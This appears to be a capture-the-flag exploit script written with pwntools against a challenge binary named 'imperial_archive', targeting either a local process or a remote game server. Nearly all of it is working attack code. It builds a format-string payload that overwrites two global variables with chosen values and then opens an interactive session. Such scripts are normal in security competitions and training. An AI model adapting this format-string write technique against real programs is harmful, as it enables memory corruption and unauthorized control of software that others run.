#!/usr/bin/env python3

from pwn import *

exe = ELF('imperial_archive', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
rop = ROP(exe)
# context.arch = 'i386'
context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x080493c5
        x/xg &mauryan_empire
        x/xg &ashoka_edict
        
        c
        ''')
        input()

if args.REMOTE:
    p = remote('play.h7tex.com', 33382)
else:
    p = process([exe.path])

GDB()
### phase 1: ###
write = {
    exe.sym.mauryan_empire : 321,
    exe.sym.ashoka_edict : 11111111,
}

payload = fmtstr_payload(4, write)
sla(b'Enter the royal inscription: ', payload)


p.interactive()